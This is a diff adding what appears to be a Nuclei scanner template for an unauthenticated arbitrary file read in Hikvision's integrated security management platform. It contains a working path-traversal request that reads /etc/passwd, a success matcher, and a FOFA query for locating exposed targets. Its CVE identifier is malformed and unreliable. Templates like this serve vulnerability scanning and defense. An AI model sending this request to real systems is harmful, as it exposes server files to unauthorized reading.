@@ -1,0 +1,39 @@
+id: 2024-105311401
+
+info:
+  name: 海康威视综合安防管理平台 orgManage/v1/orgs/download 任意文件读取漏洞
+  author: k3ppf0r
+  severity: high
+  description: |  
+    海康威视综合安防管理平台 orgManage/v1/orgs/download 接口处存在任意文件读取漏洞，未经身份验证的远程攻击者可利用目录遍历的方式绕过权限认证直接读取后台服务器配置文件等敏感文件，造成信息泄露，使系统处于极不安全的状态。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/139345652?spm=1001.2014.3001.5502
+  remediation: |
+    打对应补丁，升级至安全版本
+  classification:
+    cve-id: 2024-105311401
+    cvss-score: 7.8
+    cwe-id: CWE-552
+  metadata:
+    date: 2024-05-31
+    version: 海康威视综合安防管理平台
+    fofa-query: title="综合安防管理平台"
+  tags: lfi,leak,path
+
+
+http:
+  - raw:
+      - |
+        GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - regex('root:', body)
+          - status_code == 200
+        condition: and
